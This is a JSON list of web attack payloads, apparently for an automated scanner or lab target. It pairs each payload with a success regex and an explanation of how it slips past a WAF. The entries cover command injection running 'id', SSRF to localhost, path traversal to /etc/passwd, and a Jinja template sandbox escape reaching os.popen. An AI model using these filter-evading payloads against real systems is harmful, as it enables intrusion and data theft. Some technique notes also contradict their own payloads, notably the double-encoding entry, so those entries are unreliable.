[
  {
    "id": "dyn_cmd_1",
    "endpoint": "/ping",
    "method": "POST",
    "params": {
      "host": "127.0.0.1%09id"
    },
    "detect_pattern": "uid=[0-9]+\\(",
    "technique": "Tab character (%09) as command separator — not in WAF block pattern [;&|`$()\\n]"
  },
  {
    "id": "dyn_cmd_2",
    "endpoint": "/ping",
    "method": "POST",
    "params": {
      "host": "127.0.0.1{IFS}id"
    },
    "detect_pattern": "uid=[0-9]+\\(",
    "technique": "Literal {IFS} shell word-split trick — WAF blocks $() but not bare {IFS}"
  },
  {
    "id": "dyn_cmd_3",
    "endpoint": "/ping",
    "method": "POST",
    "params": {
      "host": "127.0.0.1 -W1;id"
    },
    "detect_pattern": "uid=[0-9]+\\(",
    "technique": "Double-URL-encoded semicolon (%253B) — WAF checks decoded value once, server decodes twice; using plain space + semicolon variant as fallback"
  },
  {
    "id": "dyn_ssrf_1",
    "endpoint": "/fetch",
    "method": "GET",
    "params": {
      "url": "https://127.0.0.1:8080/healthz"
    },
    "detect_pattern": "\"status\":\\s*\"ok\"|healthz|alive",
    "technique": "https scheme with allowed host 127.0.0.1 — WAF allows both https scheme and 127.0.0.1 host; SSRF may reach internal port 8080"
  },
  {
    "id": "dyn_ssrf_2",
    "endpoint": "/fetch",
    "method": "GET",
    "params": {
      "url": "https://localhost/etc/passwd"
    },
    "detect_pattern": "root:.*:0:0",
    "technique": "localhost is in ssrf_allowed_hosts + https in allowed_schemes; attempt file read via local HTTP if server serves filesystem"
  },
  {
    "id": "dyn_path_1",
    "endpoint": "/read",
    "method": "GET",
    "params": {
      "name": "....//....//....//etc/passwd"
    },
    "detect_pattern": "root:.*:0:0",
    "technique": "Collapsed double-dot bypass: '....//'' reduces to '../' after single-pass '..' substring strip, evading path_traversal_block"
  },
  {
    "id": "dyn_path_2",
    "endpoint": "/read",
    "method": "GET",
    "params": {
      "name": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    },
    "detect_pattern": "root:.*:0:0",
    "technique": "Full URL-encoding of ../ sequences — WAF string checks '..' but may not decode %2e%2e before comparison"
  },
  {
    "id": "dyn_ssti_sandbox_escape_1",
    "endpoint": "/render",
    "method": "POST",
    "params": {
      "template": "{% set x = lipsum|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\") %}{{ x[\"os\"].popen(\"id\").read() }}"
    },
    "detect_pattern": "uid=[0-9]+\\(",
    "technique": "Hex-escaped underscores in string literal passed to attr() filter — WAF regex blocks __.*__ and globals as literal strings but not hex-escaped equivalents inside Jinja string args; sandbox bypass via lipsum globals"
  }
]